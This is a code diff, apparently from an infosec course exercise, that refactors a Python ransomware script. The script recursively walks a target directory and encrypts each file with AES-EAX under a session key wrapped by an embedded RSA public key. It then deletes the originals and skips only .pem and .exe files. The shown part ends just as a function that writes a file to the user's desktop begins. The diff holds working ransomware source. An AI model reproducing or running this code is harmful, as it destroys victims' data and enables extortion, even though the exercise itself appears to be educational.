@@ -11,38 +11,38 @@ pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVG
 pubKey = base64.b64decode(pubKey)
 
 
-def scanRecurse(baseDir):
+def scan_recurse(base_dir):
     '''
     Scan a directory and return a list of all files
     return: list of files
     '''
-    for entry in os.scandir(baseDir):
+    for entry in os.scandir(base_dir):
         if entry.is_file():
             yield entry
         else:
-            yield from scanRecurse(entry.path)
+            yield from scan_recurse(entry.path)
 
-def encrypt(dataFile, publicKey, extension):
+def encrypt(data_file, public_key, extension):
     '''
     Input: path to file to encrypt, public key
     Output: encrypted file and remove original file
     use EAX mode to allow detection of unauthorized modifications
     '''
     # read data from file
-    dataFile = str(dataFile)
-    with open(dataFile, 'rb') as f:
+    data_file = str(data_file)
+    with open(data_file, 'rb') as f:
         data = f.read()
     
     # convert data to bytes
     data = bytes(data)
 
     # create public key object
-    key = RSA.import_key(publicKey)
+    key = RSA.import_key(public_key)
     sessionKey = os.urandom(16)
 
     # encrypt the session key with the public key
     cipher = PKCS1_OAEP.new(key)
-    encryptedSessionKey = cipher.encrypt(sessionKey)
+    encrypted_session_key = cipher.encrypt(sessionKey)
 
     # encrypt the data with the session key
     cipher = AES.new(sessionKey, AES.MODE_EAX)
@@ -52,26 +52,26 @@ def encrypt(dataFile, publicKey, extension):
     del sessionKey
     gc.collect()
     # save the encrypted data to file
-    fileName= dataFile.split(extension)[0]
-    with open(fileName, 'wb') as f:
-        data_to_write = [encryptedSessionKey, cipher.nonce, tag, ciphertext]
+    file_name = data_file.split(extension)[0]
+    with open(file_name, 'wb') as f:
+        data_to_write = [encrypted_session_key, cipher.nonce, tag, ciphertext]
         for data_chunk in data_to_write:
             f.write(data_chunk)
 
-    os.remove(dataFile)
+    os.remove(data_file)
     if extension:
-        os.rename(fileName, fileName+extension)
+        os.rename(file_name, file_name+extension)
 
 # dir to encrypt
-directory = '/home/marcelo/Documents/infosec/ex2/TestRamsware' 
-excludeExtension = ['.pem', '.exe']
+directory = '/home/marcelo/Documents/infosec/ex2/TestRansomware' 
+exclude_extension = ['.pem', '.exe']
 
-for item in scanRecurse(directory): 
-    filePath = Path(item)
-    fileType = filePath.suffix.lower()
-    if fileType in excludeExtension:
+for item in scan_recurse(directory): 
+    file_path = Path(item)
+    fileType = file_path.suffix.lower()
+    if fileType in exclude_extension:
         continue
-    encrypt(filePath, pubKey, fileType)
+    encrypt(file_path, pubKey, fileType)
 
 def create_file_on_desktop(file_name, content):
     desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
